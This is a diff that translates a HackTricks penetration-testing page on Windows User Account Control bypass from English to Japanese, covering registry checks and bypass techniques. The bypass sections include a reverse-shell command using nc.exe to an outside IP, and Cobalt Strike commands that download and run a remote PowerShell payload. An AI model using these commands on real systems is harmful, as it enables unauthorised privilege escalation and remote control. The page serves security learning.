@@ -1,131 +1,122 @@
-# UAC - User Account Control
+# UAC - ユーザーアカウント制御
 
 {{#include ../../banners/hacktricks-training.md}}
 
 <figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
 
-Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって駆動される**ワークフローを簡単に構築し、自動化**します。\
+今すぐアクセスを取得：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 ## UAC
 
-[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is a feature that enables a **consent prompt for elevated activities**. Applications have different `integrity` levels, and a program with a **high level** can perform tasks that **could potentially compromise the system**. When UAC is enabled, applications and tasks always **run under the security context of a non-administrator account** unless an administrator explicitly authorizes these applications/tasks to have administrator-level access to the system to run. It is a convenience feature that protects administrators from unintended changes but is not considered a security boundary.
+[ユーザーアカウント制御 (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)は、**昇格された活動のための同意プロンプトを有効にする**機能です。アプリケーションには異なる`integrity`レベルがあり、**高いレベル**のプログラムは、**システムを危険にさらす可能性のあるタスク**を実行できます。UACが有効になっている場合、アプリケーションとタスクは常に**非管理者アカウントのセキュリティコンテキストで実行され**、管理者が明示的にこれらのアプリケーション/タスクに管理者レベルのアクセスを許可しない限り、システムを実行することはできません。これは、管理者が意図しない変更から保護される便利な機能ですが、セキュリティ境界とは見なされません。
 
-For more info about integrity levels:
+インテグリティレベルに関する詳細情報：
 
 {{#ref}}
 ../windows-local-privilege-escalation/integrity-levels.md
 {{#endref}}
 
-When UAC is in place, an administrator user is given 2 tokens: a standard user key, to perform regular actions as regular level, and one with the admin privileges.
+UACが有効な場合、管理者ユーザーには2つのトークンが与えられます：通常のアクションを通常レベルで実行するための標準ユーザーキーと、管理者権限を持つものです。
 
-This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discusses how UAC works in great depth and includes the logon process, user experience, and UAC architecture. Administrators can use security policies to configure how UAC works specific to their organization at the local level (using secpol.msc), or configured and pushed out via Group Policy Objects (GPO) in an Active Directory domain environment. The various settings are discussed in detail [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). There are 10 Group Policy settings that can be set for UAC. The following table provides additional detail:
+この[ページ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)では、UACの動作について詳細に説明しており、ログオンプロセス、ユーザーエクスペリエンス、UACアーキテクチャが含まれています。管理者は、セキュリティポリシーを使用して、ローカルレベルで自組織に特有のUACの動作を構成することができ（secpol.mscを使用）、またはActive Directoryドメイン環境でグループポリシーオブジェクト（GPO）を介して構成して展開できます。さまざまな設定については、[こちら](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)で詳しく説明されています。UACに設定できるグループポリシー設定は10個あります。以下の表は追加の詳細を提供します：
 
-| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
+| グループポリシー設定                                                                                                                                                                                                                                                                                                                                                           | レジストリキー                | デフォルト設定                                              |
 | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
-| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
-| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
-| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
-| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
-| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
-| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
-| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
-| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
-| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
-| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |
+| [ユーザーアカウント制御：組み込みの管理者アカウントの管理者承認モード](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | 無効                                                       |
+| [ユーザーアカウント制御：UIAccessアプリケーションがセキュアデスクトップを使用せずに昇格を要求できるようにする](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | 無効                                                       |
+| [ユーザーアカウント制御：管理者の管理者承認モードにおける昇格プロンプトの動作](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | 非Windowsバイナリに対して同意を求めるプロンプト            |
+| [ユーザーアカウント制御：標準ユーザーの昇格プロンプトの動作](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | セキュアデスクトップでの資格情報を求めるプロンプト        |
+| [ユーザーアカウント制御：アプリケーションのインストールを検出し、昇格を要求する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | 有効（ホームのデフォルト）無効（エンタープライズのデフォルト） |
+| [ユーザーアカウント制御：署名され、検証された実行可能ファイルのみを昇格させる](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | 無効                                                       |
+| [ユーザーアカウント制御：セキュアな場所にインストールされたUIAccessアプリケーションのみを昇格させる](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | 有効                                                       |
+| [ユーザーアカウント制御：すべての管理者を管理者承認モードで実行する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | 有効                                                       |
+| [ユーザーアカウント制御：昇格を要求する際にセキュアデスクトップに切り替える](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | 有効                                                       |
+| [ユーザーアカウント制御：ファイルおよびレジストリの書き込み失敗をユーザーごとの場所に仮想化する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | 有効                                                       |
 
-### UAC Bypass Theory
+### UACバイパス理論
 
-Some programs are **autoelevated automatically** if the **user belongs** to the **administrator group**. These binaries have inside their _**Manifests**_ the _**autoElevate**_ option with value _**True**_. The binary has to be **signed by Microsoft** also.
+一部のプログラムは、**ユーザーが** **管理者グループに属している場合**に**自動的に昇格**されます。これらのバイナリは、_**Manifests**_内に_**autoElevate**_オプションを値_**True**_で持っています。バイナリは**Microsoftによって署名されている必要があります**。
 
-Then, to **bypass** the **UAC** (elevate from **medium** integrity level **to high**) some attackers use this kind of binaries to **execute arbitrary code** because it will be executed from a **High level integrity process**.
+次に、**UAC**を**バイパス**するために（**中**のインテグリティレベルから**高**に昇格する）、一部の攻撃者はこの種のバイナリを使用して**任意のコードを実行**します。なぜなら、それは**高いレベルのインテグリティプロセス**から実行されるからです。
 
-You can **check** the _**Manifest**_ of a binary using the tool _**sigcheck.exe**_ from Sysinternals. And you can **see** the **integrity level** of the processes using _Process Explorer_ or _Process Monitor_ (of Sysinternals).
+バイナリの_**Manifest**_を確認するには、Sysinternalsのツール_**sigcheck.exe**_を使用できます。また、プロセスの**インテグリティレベル**を確認するには、_Process Explorer_または_Sysinternals_の_Process Monitor_を使用できます。
 
-### Check UAC
+### UACの確認
 
-To confirm if UAC is enabled do:
-
+UACが有効かどうかを確認するには、次のようにします：
 ```
 REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
 
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
-    EnableLUA    REG_DWORD    0x1
+EnableLUA    REG_DWORD    0x1
 ```
+もしそれが **`1`** であれば、UACは **有効** です。もし **`0`** であるか、**存在しない** のであれば、UACは **無効** です。
 
-If it's **`1`** then UAC is **activated**, if its **`0`** or it **doesn't exist**, then UAC is **inactive**.
-
-Then, check **which level** is configured:
-
+次に、**どのレベル** が設定されているかを確認します：
 ```
 REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
 
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
-    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
+ConsentPromptBehaviorAdmin    REG_DWORD    0x5
 ```
+- **`0`** の場合、UACはプロンプトを表示しません（**無効**のように）
+- **`1`** の場合、管理者はバイナリを高い権限で実行するために**ユーザー名とパスワード**を求められます（セキュアデスクトップ上で）
+- **`2`** の場合（**常に通知**）、UACは管理者が高い権限で何かを実行しようとするたびに常に確認を求めます（セキュアデスクトップ上で）
+- **`3`** の場合、`1` と同様ですが、セキュアデスクトップ上での必要はありません
+- **`4`** の場合、`2` と同様ですが、セキュアデスクトップ上での必要はありません
+- **`5`** の場合（**デフォルト**）、非Windowsバイナリを高い権限で実行するために管理者に確認を求めます
 
-- If **`0`** then, UAC won't prompt (like **disabled**)
-- If **`1`** the admin is **asked for username and password** to execute the binary with high rights (on Secure Desktop)
-- If **`2`** (**Always notify me**) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on Secure Desktop)
-- If **`3`** like `1` but not necessary on Secure Desktop
-- If **`4`** like `2` but not necessary on Secure Desktop
-- if **`5`**(**default**) it will ask the administrator to confirm to run non Windows binaries with high privileges
+次に、**`LocalAccountTokenFilterPolicy`** の値を確認する必要があります。\
+値が **`0`** の場合、**RID 500** ユーザー（**ビルトイン管理者**）のみがUACなしで**管理タスク**を実行できます。値が `1` の場合、**「Administrators」** グループ内のすべてのアカウントがそれを実行できます。
 
-Then, you have to take a look at the value of **`LocalAccountTokenFilterPolicy`**\
-If the value is **`0`**, then, only the **RID 500** user (**built-in Administrator**) is able to perform **admin tasks without UAC**, and if its `1`, **all accounts inside "Administrators"** group can do them.
+最後に、キー **`FilterAdministratorToken`** の値を確認します。\
+**`0`**（デフォルト）の場合、**ビルトイン管理者アカウントは**リモート管理タスクを実行できます。**`1`** の場合、ビルトインアカウント管理者は**リモート管理タスクを実行できません**が、`LocalAccountTokenFilterPolicy` が `1` に設定されている場合を除きます。
 
-And, finally take a look at the value of the key **`FilterAdministratorToken`**\
-If **`0`**(default), the **built-in Administrator account can** do remote administration tasks and if **`1`** the built-in account Administrator **cannot** do remote administration tasks, unless `LocalAccountTokenFilterPolicy` is set to `1`.
+#### 概要
 
-#### Summary
+- `EnableLUA=0` または **存在しない**場合、**誰に対してもUACなし**
+- `EnableLua=1` かつ **`LocalAccountTokenFilterPolicy=1`** の場合、誰に対してもUACなし
+- `EnableLua=1` かつ **`LocalAccountTokenFilterPolicy=0`** かつ `FilterAdministratorToken=0` の場合、RID 500（ビルトイン管理者）に対してUACなし
+- `EnableLua=1` かつ **`LocalAccountTokenFilterPolicy=0`** かつ `FilterAdministratorToken=1` の場合、全員に対してUACあり
 
-- If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**
-- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**
-- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (Built-in Administrator)**
-- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**
+このすべての情報は、**metasploit** モジュール `post/windows/gather/win_privs` を使用して収集できます。
 
-All this information can be gathered using the **metasploit** module: `post/windows/gather/win_privs`
-
-You can also check the groups of your user and get the integrity level:
-
+ユーザーのグループを確認し、整合性レベルを取得することもできます。
 ```
 net user %username%
 whoami /groups | findstr Level
 ```
-
-## UAC bypass
+## UACバイパス
 
 > [!NOTE]
-> Note that if you have graphical access to the victim, UAC bypass is straight forward as you can simply click on "Yes" when the UAC prompt appears
+> 被害者にグラフィカルアクセスがある場合、UACバイパスは簡単で、UACプロンプトが表示されたときに「はい」をクリックするだけです。
 
-The UAC bypass is needed in the following situation: **the UAC is activated, your process is running in a medium integrity context, and your user belongs to the administrators group**.
+UACバイパスは以下の状況で必要です: **UACが有効で、プロセスが中程度の整合性コンテキストで実行されており、ユーザーが管理者グループに属している場合**。
 
-It is important to mention that it is **much harder to bypass the UAC if it is in the highest security level (Always) than if it is in any of the other levels (Default).**
+UACが最高のセキュリティレベル（常に）に設定されている場合、他のレベル（デフォルト）の場合よりも**UACをバイパスするのははるかに難しい**ことを言及することが重要です。
 
-### UAC disabled
+### UAC無効
 
-If UAC is already disabled (`ConsentPromptBehaviorAdmin` is **`0`**) you can **execute a reverse shell with admin privileges** (high integrity level) using something like:
-
+UACがすでに無効になっている場合（`ConsentPromptBehaviorAdmin`が**`0`**）、次のようなもので**管理者権限でリバースシェルを実行**できます:
 ```bash
 #Put your reverse shell instead of "calc.exe"
 Start-Process powershell -Verb runAs "calc.exe"
 Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
 ```
-
-#### UAC bypass with token duplication
+#### UACバイパスとトークン複製
 
 - [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
 - [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)
 
-### **Very** Basic UAC "bypass" (full file system access)
+### **非常に** 基本的なUAC "バイパス"（フルファイルシステムアクセス）
 
-If you have a shell with a user that is inside the Administrators group you can **mount the C$** shared via SMB (file system) local in a new disk and you will have **access to everything inside the file system** (even Administrator home folder).
+管理者グループに属するユーザーのシェルがある場合、**C$** 共有をSMB（ファイルシステム）経由で新しいディスクにマウントすることで、**ファイルシステム内のすべてにアクセスできます**（管理者のホームフォルダも含む）。
 
 > [!WARNING]
-> **Looks like this trick isn't working anymore**
-
+> **このトリックはもう機能していないようです**
 ```bash
 net use Z: \\127.0.0.1\c$
 cd C$
@@ -133,11 +124,9 @@ cd C$
 #Or you could just access it:
 dir \\127.0.0.1\c$\Users\Administrator\Desktop
 ```
+### UACバイパスとCobalt Strike
 
-### UAC bypass with cobalt strike
-
-The Cobalt Strike techniques will only work if UAC is not set at it's max security level
-
+Cobalt Strikeの技術は、UACが最大のセキュリティレベルに設定されていない場合にのみ機能します。
 ```bash
 # UAC bypass via token duplication
 elevate uac-token-duplication [listener_name]
@@ -149,20 +138,18 @@ runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-obj
 # Bypass UAC with CMSTPLUA COM interface
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 ```
-
-**Empire** and **Metasploit** also have several modules to **bypass** the **UAC**.
+**Empire** と **Metasploit** には、**UAC** を **バイパス** するためのいくつかのモジュールがあります。
 
 ### KRBUACBypass
 
-Documentation and tool in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
+ドキュメントとツールは [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass) にあります。
 
-### UAC bypass exploits
+### UAC バイパスエクスプロイト
 
-[**UACME** ](https://github.com/hfiref0x/UACME)which is a **compilation** of several UAC bypass exploits. Note that you will need to **compile UACME using visual studio or msbuild**. The compilation will create several executables (like `Source\Akagi\outout\x64\Debug\Akagi.exe`) , you will need to know **which one you need.**\
-You should **be careful** because some bypasses will **prompt some other programs** that will **alert** the **user** that something is happening.
+[**UACME**](https://github.com/hfiref0x/UACME) は、いくつかの UAC バイパスエクスプロイトの **コンパイル** です。**UACME を Visual Studio または msbuild を使用してコンパイルする必要があります**。コンパイルにより、いくつかの実行可能ファイル（例えば `Source\Akagi\outout\x64\Debug\Akagi.exe`）が作成されます。**どれが必要かを知っておく必要があります。**\
+**注意が必要** です。なぜなら、いくつかのバイパスは **他のプログラムを促す** ことがあり、**ユーザー** に何かが起こっていることを **警告** します。
 
-UACME has the **build version from which each technique started working**. You can search for a technique affecting your versions:
-
+UACME には、各技術が動作し始めた **ビルドバージョン** があります。あなたのバージョンに影響を与える技術を検索できます：
 ```
 PS C:\> [environment]::OSVersion.Version
 
@@ -170,50 +157,48 @@ Major  Minor  Build  Revision
 -----  -----  -----  --------
 10     0      14393  0
 ```
+また、[この](https://en.wikipedia.org/wiki/Windows_10_version_history)ページを使用すると、ビルドバージョンからWindowsリリース`1607`を取得できます。
 
-Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.
+#### さらなるUACバイパス
 
-#### More UAC bypass
+**ここで使用されるすべての技術は、AUCをバイパスするために** **完全なインタラクティブシェル** **を必要とします**（一般的なnc.exeシェルでは不十分です）。
 
-**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).
-
-You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:
+**meterpreter**セッションを使用して取得できます。**Session**値が**1**に等しい**プロセス**に移行します：
 
 ![](<../../images/image (863).png>)
 
-(_explorer.exe_ should works)
+（_explorer.exe_は動作するはずです）
 
-### UAC Bypass with GUI
+### GUIを使用したUACバイパス
 
-If you have access to a **GUI you can just accept the UAC prompt** when you get it, you don't really need a bypass it. So, getting access to a GUI will allow you to bypass the UAC.
+**GUIにアクセスできる場合、UACプロンプトが表示されたときにそれを受け入れるだけで済みます**。実際にはバイパスは必要ありません。したがって、GUIにアクセスすることでUACをバイパスできます。
 
-Moreover, if you get a GUI session that someone was using (potentially via RDP) there are **some tools that will be running as administrator** from where you could **run** a **cmd** for example **as admin** directly without being prompted again by UAC like [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). This might be a bit more **stealthy**.
+さらに、誰かが使用していたGUIセッション（おそらくRDP経由）を取得した場合、**管理者として実行されるいくつかのツール**があり、そこから**cmd**を例えば**管理者として**直接実行でき、再度UACによるプロンプトが表示されることはありません。 [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)。これは少し**ステルス**になるかもしれません。
 
-### Noisy brute-force UAC bypass
+### 騒がしいブルートフォースUACバイパス
 
-If you don't care about being noisy you could always **run something like** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) that **ask to elevate permissions until the user does accepts it**.
+騒がしいことを気にしないのであれば、常に[**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin)のようなものを**実行することができます**。これは**ユーザーが受け入れるまで権限を昇格するように要求します**。
 
-### Your own bypass - Basic UAC bypass methodology
+### 自分自身のバイパス - 基本的なUACバイパス手法
 
-If you take a look to **UACME** you will note that **most UAC bypasses abuse a Dll Hijacking vulnerabilit**y (mainly writing the malicious dll on _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/).
+**UACME**を見てみると、**ほとんどのUACバイパスはDll Hijackingの脆弱性を悪用しています**（主に悪意のあるdllを_C:\Windows\System32_に書き込むこと）。[Dll Hijackingの脆弱性を見つける方法を学ぶにはこれを読んでください](../windows-local-privilege-escalation/dll-hijacking/)。
 
-1. Find a binary that will **autoelevate** (check that when it is executed it runs in a high integrity level).
-2. With procmon find "**NAME NOT FOUND**" events that can be vulnerable to **DLL Hijacking**.
-3. You probably will need to **write** the DLL inside some **protected paths** (like C:\Windows\System32) were you don't have writing permissions. You can bypass this using:
-   1. **wusa.exe**: Windows 7,8 and 8.1. It allows to extract the content of a CAB file inside protected paths (because this tool is executed from a high integrity level).
-   2. **IFileOperation**: Windows 10.
-4. Prepare a **script** to copy your DLL inside the protected path and execute the vulnerable and autoelevated binary.
+1. **自動昇格**するバイナリを見つけます（実行時に高い整合性レベルで実行されることを確認します）。
+2. procmonを使用して、**DLL Hijacking**に脆弱な**"NAME NOT FOUND"**イベントを見つけます。
+3. おそらく、**書き込み権限がない**いくつかの**保護されたパス**（C:\Windows\System32など）内にDLLを**書き込む**必要があります。これをバイパスするには：
+   1. **wusa.exe**：Windows 7、8、8.1。CABファイルの内容を保護されたパス内に抽出することができます（このツールは高い整合性レベルから実行されるため）。
+   2. **IFileOperation**：Windows 10。
+4. 保護されたパス内にDLLをコピーし、脆弱で自動昇格されたバイナリを実行するための**スクリプト**を準備します。
 
-### Another UAC bypass technique
+### 別のUACバイパス技術
 
-Consists on watching if an **autoElevated binary** tries to **read** from the **registry** the **name/path** of a **binary** or **command** to be **executed** (this is more interesting if the binary searches this information inside the **HKCU**).
+**自動昇格されたバイナリ**が**実行される**ための**バイナリ**または**コマンド**の**名前/パス**を**レジストリ**から**読み取ろうとする**のを監視することに基づいています（これは、バイナリが**HKCU**内でこの情報を検索する場合により興味深いです）。
 
 <figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
 
-Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で最も**高度な**コミュニティツールによって強化された**ワークフローを簡単に構築および自動化**します。\
+今すぐアクセスを取得：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 {{#include ../../banners/hacktricks-training.md}}
-
